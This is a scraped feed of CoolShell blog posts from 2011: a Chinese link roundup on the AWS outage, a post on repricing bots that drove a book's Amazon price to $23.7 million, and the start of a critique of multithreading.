<p>最近，互联网上最大的事可能是Amazon的AWS宕机了，而且好几天都没有完全恢复。整个Internet都在讨论这个事，Internet很不高兴，后果可能很严重。可能是因为这个事件对中国没有影响，所以中文这边相关的文章不多，大家可以参考一下和讯网的这篇《<a href="http://tech.hexun.com/2011-04-24/128998619.html" target="_blank">伤不起！亚马逊史前最大宕机事件的启示</a>》。</p>
<p>国外有人把所有和这个事件相关的贴子都收集了起来，都是一些相当不错的贴子和文章，尤其是一些经验教训的贴子，很受教，转给大家看看。这个贴子的<a href="http://highscalability.com/blog/2011/4/25/the-big-list-of-articles-on-the-amazon-outage.html" target="_blank">来源在这里</a>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%AA%E5%88%AB%E5%85%AC%E5%8F%B8%E7%9A%84%E7%BB%8F%E5%8E%86%EF%BC%8C%E6%9C%89%E5%A5%BD%E6%9C%89%E5%9D%8F" title="个别公司的经历，有好有坏">个别公司的经历，有好有坏</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Amazon_Web_Services_%E8%AE%A8%E8%AE%BA%E5%8C%BA" title="Amazon Web Services 讨论区">Amazon Web Services 讨论区</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%AB%8B%E5%9C%BA%EF%BC%9A%E8%BF%99%E6%98%AF%E7%94%A8%E6%88%B7%E7%9A%84%E9%94%99" title="立场：这是用户的错">立场：这是用户的错</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%AB%8B%E5%9C%BA%EF%BC%9A%E8%BF%99%E6%98%AFAmazon%E7%9A%84%E9%94%99" title="立场：这是Amazon的错">立场：这是Amazon的错</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%95%99%E8%AE%AD%E5%92%8C%E5%90%AF%E7%A4%BA" title="教训和启示">教训和启示</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Vendor%E5%BE%88%E7%94%9F%E6%B0%94" title="Vendor很生气">Vendor很生气</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%AA%E5%88%AB%E5%85%AC%E5%8F%B8%E7%9A%84%E7%BB%8F%E5%8E%86%EF%BC%8C%E6%9C%89%E5%A5%BD%E6%9C%89%E5%9D%8F"></span>个别公司的经历，有好有坏<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="https://status.heroku.com/incident/151">How Heroku Survived the Amazon Outage</a> on the Heroku status page</li>
<li>
<a href="http://developers.simplegeo.com/blog/2011/04/26/how-simplegeo-stayed-up/">How SimpleGeo Stayed Up During the AWS Downtime</a> by Mike Malone</li>
<li>
<a href="http://don.blogs.smugmug.com/2011/04/24/how-smugmug-survived-the-amazonpocalypse">How SmugMug survived the Amazonpocalypse</a> by Don MacAskill  (<a href="https://news.ycombinator.com/item?id=2480763">Hacker News</a> discussion)</li>
<li>
<a href="http://dev.bizo.com/2011/04/how-bizo-survived-great-aws-outage-of.html">How Bizo survived the Great AWS Outage of 2011 relatively unscathed…</a> by Someone at Bizo</li>
<li>
<a href="http://www.focus.com/questions/information-technology/amazon-ec2-has-gone-down--what-would-prefered-hosting-be/#comment43192">Joe Stump’s explanation</a> of how SimpleGeo survived</li>
<li><a href="http://www.slideshare.net/adrianco/netflix-in-the-cloud-2011">How Netflix Survived the Outage</a></li>
<li>
<a href="https://www.twilio.com/engineering/2011/04/22/why-twilio-wasnt-affected-by-todays-aws-issues/">Why Twilio Wasn’t Affected by Today’s AWS Issues</a> on Twilio Engineering’s Blog (<a href="https://news.ycombinator.com/item?id=2472999">Hacker News</a> thread)</li>
<li><a href="https://www.reddit.com/r/announcements/comments/gva4t/on_reddits_outage/#">On reddit’s outage</a></li>
<li><a href="https://www.quora.com/Quora-Outage-April-21-22-2011/What-caused-the-Quora-problems-outage-in-April-2011">What caused the Quora problems/outage in April 2011?</a></li>
<li>
<a href="http://tomatohater.com/2011/04/21/recovering-amazon-cloud-outage/">Recovering from Amazon cloud outage</a> by Drew Engelson of PBS.
<ul>
<li>PBS was affected for a while primarily because we do use EBS-backed RDS databases. Despite being spread across multiple availability-zones, we weren’t easily able to launch new resources ANYWHERE in the East region since everyone else was trying to do the same. I ended up pushing the RDS stuff out West for the time being.  <a href="http://don.blogs.smugmug.com/2011/04/24/how-smugmug-survived-the-amazonpocalypse/#comment-4737">From Comment</a>
</li>
</ul>
</li>
</ul>
<p><span id="more-4601"></span></p>
<h4>
<span class="ez-toc-section" id="Amazon_Web_Services_%E8%AE%A8%E8%AE%BA%E5%8C%BA"></span>Amazon Web Services 讨论区<span class="ez-toc-section-end"></span>
</h4>
<p>有一些有经验的人共享了很多相当不错的宕机的经历。</p>
<ul>
<li><a href="https://forums.aws.amazon.com/forum.jspa?forumID=30&amp;start=0">Amazon Web Services Discussion Forum</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65860&amp;tstart=0">Cost-effective backup plan from now on?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65649&amp;tstart=0">Life of our patients is at stake – I am desperately asking you to contact</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65897&amp;tstart=0"> Why did the EBS, RDS, Cloudformation, Cloudwatch and Beanstalk all fail?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65896&amp;tstart=0">Moved all resources off of AWS</a></li>
<li><a href="https://forums.aws.amazon.com/forum.jspa?forumID=30&amp;start=300">Any success stories?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65784&amp;tstart=25">Is the mass exodus from East going to cause demand problems in the West?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65828&amp;tstart=25"> Finally back online after about 71 hours</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65834&amp;tstart=25">Amazon EC2 features vs windows azure</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65221&amp;tstart=25"> Aren’t Availability Zones supposed to be “insulated from failures”?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65850&amp;tstart=0">What a lot of people aren’t realizing about the downtime:</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=32044&amp;tstart=50&amp;start=150">ELB CNAME</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65457&amp;tstart=425"> Availability Zones were used in a misleading manner</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65371&amp;tstart=325">Tip: How to recover your instance</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65617&amp;tstart=325">Crying in Forum Gets Results, Silver-level AWS Premium Support Doesn’t</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65780&amp;tstart=25"> Well-worth reading: “design for failure” cloud deployment strategy</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65749&amp;tstart=25">New best practice</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65136&amp;tstart=475">Don’t bother with Premium Support</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65185&amp;tstart=450">Best practices for multi-region redundancy</a></li>
<li> “<a href="https://forums.aws.amazon.com/thread.jspa?threadID=65450&amp;tstart=175">Postmortum</a>“</li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65513&amp;tstart=125">Learning from this case</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65388&amp;tstart=525"> Amazon, still no instructions what to do?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65338&amp;tstart=550">Anyone else prepared for an all-nighter?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65811&amp;tstart=100">Is Jeff Bezos going to give a public statement?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65857&amp;tstart=100"> Rackspace, GoGrid, StormonDemand and Others</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65815&amp;tstart=150">Jeff Barr, Werner Vogels and other AWS persons – where have you been???</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65168&amp;tstart=175">After you guys fix EBS do I have do anything on my side?</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65765&amp;tstart=225"> Need Help!!! Lives of people and billions in revenue are at risk now!!!</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65678&amp;tstart=275">I’ve Got A Suspicion</a></li>
<li><a href="https://forums.aws.amazon.com/thread.jspa?threadID=65585&amp;tstart=325"> Farewell EC2, Farewell</a></li>
</ul>
<p>There were also many many instances of support and help in the log.</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://blog.rightscale.com/2011/04/25/amazon-ec2-outage-summary-and-lessons-learned/">Amazon EC2 outage: summary and lessons learned</a> by RightScale</li>
<li>
<a href="http://www.randomhacks.net/articles/2011/04/25/aws-outage-timeline-and-recovery-strategy-downtimes">AWS outage timeline &amp; downtimes by recovery strategy</a> by Eric Kidd</li>
<li>
<a href="http://www.datacenterknowledge.com/archives/2011/04/25/the-aftermath-of-amazons-cloud-outage">The Aftermath of Amazon’s Cloud Outage</a> by Rich Miller</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%AB%8B%E5%9C%BA%EF%BC%9A%E8%BF%99%E6%98%AF%E7%94%A8%E6%88%B7%E7%9A%84%E9%94%99"></span>立场：这是用户的错<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.thestoragearchitect.com/2011/04/22/so-your-aws-based-application-is-down-dont-blame-amazon/">So Your AWS-based Application is Down? Don’t Blame Amazon</a> by The Storage Architect</li>
<li>
<a href="http://stu.mp/2011/04/the-cloud-is-not-a-silver-bullet.html">The Cloud is not a Silver Bullet</a> by Joe Stump (<a href="https://news.ycombinator.com/item?id=2482581">Hacker News</a> thread)</li>
<li>
<a href="http://broadcast.oreilly.com/2011/04/the-aws-outage-the-clouds-shining-moment.html">The AWS Outage: The Cloud’s Shining Moment</a> by George Reese (<a href="https://news.ycombinator.com/item?id=2477540">Hacker News</a> discussion)</li>
<li>
<a href="http://blog.acrowire.com/cloud-computing/failing-to-plan-is-planning-to-fail">Failing to Plan is Planning to Fail</a> by Ted Theodoropoulos</li>
<li>
<a href="https://groups.google.com/group/cloud-computing/browse_thread/thread/e8079a54e6a8c4b9/72756bf9e587869d?show_docid=72756bf9e587869d">Get a life and build redundancy/resiliency in your apps</a> on the Cloud Computing group</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%AB%8B%E5%9C%BA%EF%BC%9A%E8%BF%99%E6%98%AFAmazon%E7%9A%84%E9%94%99"></span>立场：这是Amazon的错<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.readwriteweb.com/cloud/2011/04/almost-as-galling-as-the.php">Stop Blaming the Customers – the Fault is on Amazon Web Services</a> by Klint Finley</li>
<li>
<a href="http://justinsb.posterous.com/aws-down-why-the-sky-is-falling">AWS is down: Why the sky is falling</a> by Justin Santa Barbara  (<a href="https://news.ycombinator.com/item?id=2471899">Hacker News</a> thread)</li>
<li>
<a href="https://news.ycombinator.com/item?id=2469838">Amazon Web Services are down</a> – Huge Hacker News thread</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%95%99%E8%AE%AD%E5%92%8C%E5%90%AF%E7%A4%BA"></span>教训和启示<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="https://smoothspan.wordpress.com/2011/04/23/people-using-amazon-cloud-get-some-cheap-insurance-at-least/">People Using Amazon Cloud: Get Some Cheap Insurance At Least</a> by Bob Warfield</li>
<li>
<a href="http://ronaldbradford.com/blog/basic-scalability-principles-to-avert-downtime-2011-04-23">Basic scalability principles to avert downtime</a> by Ronald Bradford</li>
<li>
<a href="http://www.itworld.com/cloud-computing/158517/amazon-crash-reveals-cloud-computing-actually-based-data-centers">Amazon crash reveals ‘cloud’ computing actually based on data centers</a> by Kevin Fogarty</li>
<li>
<a href="https://www.zdnet.com/blog/saas/seven-lessons-to-learn-from-amazons-outage/1296">Seven lessons to learn from Amazon’s outage</a> By Phil Wainewright</li>
<li>
<a href="http://www.cloudsigma.com/en/blog/2011/04/23/21-cloud-outages-lessons-learned">The Cloud and Outages : Five Key Lessons</a> by Patrick Baillie (<a href="https://groups.google.com/group/cloud-computing/browse_thread/thread/6e9549afbff6386f/05919d8527c69a09?show_docid=05919d8527c69a09#">Cloud Computing Group</a> discussion)</li>
<li>
<a href="http://till.klampaeckel.de/blog/archives/151-Some-thoughts-on-outtages.html">Some thoughts on outages</a> by Till Klampaeckel</li>
<li>
<a href="https://www.geekwire.com/2011/amazoncoms-real-problem-outage-communication">Amazon.com’s real problem isn’t the outage, it’s the communication</a> by Keith Smith</li>
<li>
<a href="https://webmonkeyuk.wordpress.com/2011/04/21/how-to-work-around-amazon-ec2-outages/">How to work around Amazon EC2 outages</a> by James Cohen (<a href="https://news.ycombinator.com/item?id=2471258">Hacker News</a> thread)</li>
<li>
<a href="http://agilesysadmin.net/ec2-outage-lessons">Today’s EC2 / EBS Outage: Lessons learned</a> on Agile Sysadmin</li>
<li>
<a href="http://www.focus.com/questions/information-technology/amazon-ec2-has-gone-down--what-would-prefered-hosting-be/">Amazon EC2 has gone down -what would a prefered hosting platform be?</a> on Focus</li>
<li>
<a href="http://cloudability.com/single-points-of-failure">Single Points of Failure</a> by Mat</li>
<li><a href="https://www.reddit.com/r/programming/comments/gvac7/coping_with_cloud_downtime_with_puppet/">Coping with Cloud Downtime with Puppet</a></li>
<li>
<a href="http://timcrawford.org/2011/04/21/amazon-outage-concerns-are-overblown/">Amazon Outage Concerns Are Overblown</a> by Tim Crawford</li>
<li>
<a href="http://claylo.com/post/4817029650/where-there-are-clouds-it-sometimes-rains">Where There Are Clouds, It Sometimes Rains</a> by Clay Loveless</li>
<li>
<a href="http://blog.learnboost.com/blog/availability-redundancy-and-failover-at-learnboost/">Availability, redundancy, failover and data backups at LearnBoost </a> by Guillermo Rauch</li>
<li>
<a href="http://chrischandler.name/the-real-cost-of-cloud-hosting">Cloud hosting vs colocation</a> by Chris Chandler (<a href="https://news.ycombinator.com/item?id=2482123">Hacker News</a> thread)</li>
<li>
<a href="http://arnon.me/2011/04/amazons-ec2-ebs-outage/">Amazon’s EC2 &amp; EBS outage</a> by Arnon Rotem-Gal-Oz</li>
</ul>
<h4>
<span class="ez-toc-section" id="Vendor%E5%BE%88%E7%94%9F%E6%B0%94"></span>Vendor很生气<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.productionscale.com/home/2011/4/22/on-clouds-and-spofs-or-the-great-aws-outage-of-april-2011.html#axzz1KZPTwX4z">Amazon Outage Proves Value of Riak’s Vision</a> by Basho</li>
<li>
<a href="http://joyeur.com/2011/04/24/magical-block-store-when-abstractions-fail-us/">Magical Block Store: When Abstractions Fail Us</a> by Mark Joyent (<a href="https://news.ycombinator.com/item?id=2479613">Hacker News</a> discussion)</li>
<li>
<a href="http://joyeur.com/2011/04/22/on-cascading-failures-and-amazons-elastic-block-store/">On Cascading Failures and Amazon’s Elastic Block Store</a> by Jason</li>
<li>
<a href="http://cloudharmony.com/b/2011/04/unofficial-ec2-outage-postmortem-sky-is.html">An unofficial EC2 outage postmortem – the sky is not falling</a> from CloudHarmony</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/17737.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17737.html" class="wp_rp_title">AWS 的 S3 故障回顾和思考</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6142.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6142.html" class="wp_rp_title">三个事和三个问题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5901.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5901.html" class="wp_rp_title">腾讯，竞争力 和 用户体验</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5815.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_title">来信， 创业 和 移动互联网</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5701.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5701.html" class="wp_rp_title">SteveY对Amazon和Google平台的吐槽</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4605.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4605.html" class="wp_rp_title">Amazon的书为什么卖到了$2000万</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4601" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="6798419546">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>7</strong> 人打了分，平均分： <strong>3.86</strong> )<br><span class="post-ratings-text" id="ratings_4601_text"></span><meta itemprop="name" content="关于Amazon云宕机的网贴收集">
<meta itemprop="headline" content="关于Amazon云宕机的网贴收集">
<meta itemprop="description" content="最近，互联网上最大的事可能是Amazon的AWS宕机了，而且好几天都没有完全恢复。整个Internet都在讨论这个事，Internet很不高兴，后果可能很严重。可能是因为这个事件对中国没有影响，所以中文这边相关的文章不多，大家可以参考一下和讯网的这篇《伤不起！亚马逊史前最大宕机事件的启示》。

国外有人把所有和这个事件相关的贴子都收集了起来，都是一些相当不错的贴子和文章，尤其是一些经验教训的贴...">
<meta itemprop="datePublished" content="2011-04-27T22:49:07+08:00">
<meta itemprop="dateModified" content="2011-04-27T22:49:07+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4601.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4601.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.86">
<meta itemprop="ratingCount" content="7">
</div>
</div>
<div id="post-ratings-4601-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-27T22:49:07+08:00</pubDate>
<guid>https://coolshell.cn/articles/4601.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Amazon的书为什么卖到了$2000万 ]]></title>
<link>https://coolshell.cn/articles/4605.html</link>
<content><![CDATA[ 
<p>最近，Amazon的新闻比较多，除了<a title="关于Amazon云宕机的网贴收集" href="https://coolshell.cn/articles/4601.html" target="_blank">Amazon的云平台宕机</a>外，还有一个被热炒的新闻是在Amazon的书店里，有一本书要买$23,698,655.93美元，相当于1亿5千万人民币（如下图所示），这个事情是由UC Berkeley的生物学家Michael Eisen发现的，然后他在他的博客上写了<a title="Amazon’s $23,698,655.93 book about flies" href="http://www.michaeleisen.org/blog/?p=358" target="_blank">一篇文章来说明这个事情</a>。</p>
<p>这本书是1992年，现在绝版了，生物学家决定上Amazon找一下，结果看到了有两本新书，还有一些二手的，二手书价比较正常，但是那两个新书的价都上了百万。这个生物学家还写了邮件给原作者和原作者开了玩笑。呵呵。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>一般人可能就把这个事当成个笑话了，不过，教授就是教授，它还认真的研究了一下为什么会这样。</p>
<p><span id="more-4605"></span></p>
<p>首先，这个不是Amazon的订价的问题，这是Amazon的第三方商户平台两个商户报价，一个商户叫profnath，另一个商户叫bordeebook。我们的生物学教授观察这两个商户的书价了几天，看到了下面的结果：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>从上面的表中，我们可以看到，profnath商户的价格总是bordeebook的99.83%，而bordeebook的总是比profnath的高27.059%，很明显，这两个商户用的是程序在自动定价——“自动竞价”。</p>
<ul>
<li>profnath商户想把书买出去，所以，其订价要比最高价要低一些（99.83%），这个很容易理解。</li>
<li>bordeebook商户为什么要比最高价要高1.27倍呢？合理的解释是，bordeebook并没有这本书，这个商户只是想用更多的选品来吸引买家，这样可以让人觉得他和竞争对手有一样多的选品。所以，他要把价订得高一点，这样就算是被人下单，他可以从别人手里把书买过来，然后再卖给卖家。27%的空间，够他赚了。</li>
</ul>
<p>因为两个商户订的比例不一样，所以，这两个商户的自动订价系统就成了相互涨价的程序——profnath以差0.17%差价跟上，而bordeebook以27%的幅度甩开，profnth再跟上，bordeebook再甩开……。于是最后的价格就到了$23,698,655.93美金。呵呵。</p>
<p>下面，我说说我的收获——</p>
<ul>
<li>
<strong>能力</strong>：我非常欣赏这位生物学教授的求甚解的态度，这和<a title="Linux 2.6.39-rc3的一个插曲" href="https://coolshell.cn/articles/4576.html" target="_blank">Linus要求其团队成员的能力</a>如出一辙。赞一个！</li>
<li>
<strong>商业</strong>：从这两个商户的行为看到了一种相反的商业技巧。profnath 和 bordeebook  都是聪明的商家。</li>
<li>
<strong>电商</strong>：自动定价系统可能会成为未来电子商务的一个重要的方向。电子商务还有很多东西可以做啊。</li>
<li>
<strong>程序</strong>：程序设计中需要加上边界条件，最高值和最低值（当然，我能理解为什么这两个商户没有回，因为不同的商品价格差得太大，也许他们也在卖一些几百万的商品）。</li>
</ul>
<p>最后，这本书的网址在这里《<a href="https://www.amazon.com/gp/offer-listing/0632030488/ref=dp_olp_0?ie=UTF8&amp;redirect=true&amp;qid=1303712892&amp;sr=8-1&amp;condition=all" target="_blank">The Making of a Fly: The Genetics of Animal Design</a>》，你可以看到价格又在攀升了，昨天我看的是200多美，我写这篇文章此时的价格是近1000美金了。呵呵。</p>
<p>（全文完）</p>
<p><span style="color: #cc0000; font-size: 14px;"><strong>（请勿用于商业用途，转载时请注明作者和出处）</strong></span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8990.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8990.html" class="wp_rp_title">Linus：利用二级指针删除单向链表</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8745.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8745.html" class="wp_rp_title">如此理解面向对象编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7886.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_title">代码执行的效率</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6470.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6470.html" class="wp_rp_title">由12306.cn谈谈网站性能技术 </a>
</li>
<li>
<a href="https://coolshell.cn/articles/6142.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6142.html" class="wp_rp_title">三个事和三个问题</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4605" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="39f2b68a0e">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>19</strong> 人打了分，平均分： <strong>4.37</strong> )<br><span class="post-ratings-text" id="ratings_4605_text"></span><meta itemprop="name" content="Amazon的书为什么卖到了$2000万">
<meta itemprop="headline" content="Amazon的书为什么卖到了$2000万">
<meta itemprop="description" content="最近，Amazon的新闻比较多，除了Amazon的云平台宕机外，还有一个被热炒的新闻是在Amazon的书店里，有一本书要买$23,698,655.93美元，相当于1亿5千万人民币（如下图所示），这个事情是由UC Berkeley的生物学家Michael Eisen发现的，然后他在他的博客上写了一篇文章来说明这个事情。

这本书是1992年，现在绝版了，生物学家决定上Amazon找一下，结果看到...">
<meta itemprop="datePublished" content="2011-04-28T12:41:41+08:00">
<meta itemprop="dateModified" content="2011-04-29T12:05:49+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4605.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4605.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.37">
<meta itemprop="ratingCount" content="19">
</div>
</div>
<div id="post-ratings-4605-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-28T12:41:41+08:00</pubDate>
<guid>https://coolshell.cn/articles/4605.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 读书笔记：对线程模型的批评 ]]></title>
<link>https://coolshell.cn/articles/4626.html</link>
<content><![CDATA[ 
<p><span style="color: #cc0000;"><strong>——感谢Ian.Sian投递本文——</strong></span></p>
<p>多线程模型是主流的并发编程模型。在过去几十年来，多线程模型一直是开发并发程序的有力工具。然而，它的历史并非总那么美好。1997年，NASA 的“火星探路者”号在执行任务的途中遭遇了严重的时序异常（参见 “<a href="http://research.microsoft.com/en-us/um/people/mbj/mars_pathfinder/mars_pathfinder.html" target="_blank">What really happend on Mars</a>“，注目 follow-up 中的<a href="http://research.microsoft.com/en-us/um/people/mbj/mars_pathfinder/Authoritative_Account.html" target="_blank">现身说法</a>），无法发回探测数据。如果不是 NASA 远程刷新了程序，它的结局就只能是报废在火星上。这一切都是由程序中潜藏的一个优先级反转 bug 造成的。更早的例子还有80年代的一系列 <a title="Therac-25" href="https://en.wikipedia.org/wiki/Therac-25" target="_blank">Therac-25</a> 型医用粒子加速器事故。在这些加速器释放出的过量辐射照射之下，数位病人死亡。事后调查显示，至少有一次发生事故的原因，是加速器的控制软件中，存在一个只能由特定操作序列引发的竞争条件 bug。你也许认为这些只是陈年往事，但是直到现在，即便是世界500强公司们高价买来的信息系统，也同样避免不了这些问题。这导致许多程序员认为线程是个潘多拉魔盒，对它采取能躲就躲的态度。然而近来计算机的发展使得躲猫猫的空间越来越小：随便从市场上淘一个CPU，它里面也有不止一个核心。未来的程序员只会有越来越多的机会接触到并发编程，而无法再独善其身了。</p>
